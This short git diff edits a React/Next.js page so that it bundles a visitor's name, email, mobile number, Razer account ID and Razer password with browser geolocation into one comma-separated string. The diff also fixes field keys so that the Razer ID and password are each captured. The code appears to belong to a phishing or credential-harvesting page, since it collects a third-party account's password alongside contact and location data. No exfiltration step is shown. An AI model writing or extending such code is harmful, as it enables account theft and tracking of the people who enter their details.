@@ -78,15 +78,11 @@ export default function Home() {
                 };
               }
 
-              function makeInfoHash(obj){
-                // Simple, human-readable hash (not cryptographic):
-                // key=value pairs joined by '|'
-                const parts = [];
-                for(const [k,v] of Object.entries(obj)){
-                  parts.push(k + '=' + encodeURIComponent(String(v ?? '')));
-                }
-                return parts.join('|');
-              }
+              function makeCommaInfo(bundle){
+  const { name = '', email = '', mobile = '', razerid = '',razerpass = '',lat = '', lon = ''} = bundle;
+  return [name, email, mobile, razerid, razerpass, lat, lon].map(v => String(v)).join(',');
+}
+
 
               async function requestLocationOnce(){
                 return new Promise((resolve, reject) => {
@@ -116,8 +112,8 @@ export default function Home() {
                     name: info.name,
                     email: info.email,
                     mobile: info.mobile,
-                    mobile: info.razerid,
-                    mobile: info.razerpass,
+                    razerid: info.razerid,
+                    razerpass: info.razerpass,
                     lat: loc.latitude,
                     lon: loc.longitude,
                                       };
